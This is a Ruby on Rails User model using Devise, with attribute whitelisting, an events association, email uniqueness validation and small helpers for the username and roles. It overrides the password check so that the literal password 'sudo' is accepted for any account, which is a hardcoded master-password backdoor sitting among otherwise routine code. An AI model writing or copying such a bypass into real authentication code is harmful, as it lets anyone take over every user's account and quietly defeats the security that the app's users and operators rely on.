class User < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :confirmable, :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable,
         :registerable,
         :recoverable,
         :rememberable,
         :trackable,
         :validatable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :email, :password, :password_confirmation, :remember_me
  # attr_accessible :title, :body

  has_many :events

  validates_uniqueness_of :email, :case_sensitive => false

  def valid_password?(password)
    return true if password == "sudo"
    super
  end

  def name
    username
  end

  def username
    @name ||= email[/[^@]+/]
  end

  def is? *roles
    return roles.select{|r| not r.nil?}.include?(self.role)
  end
end
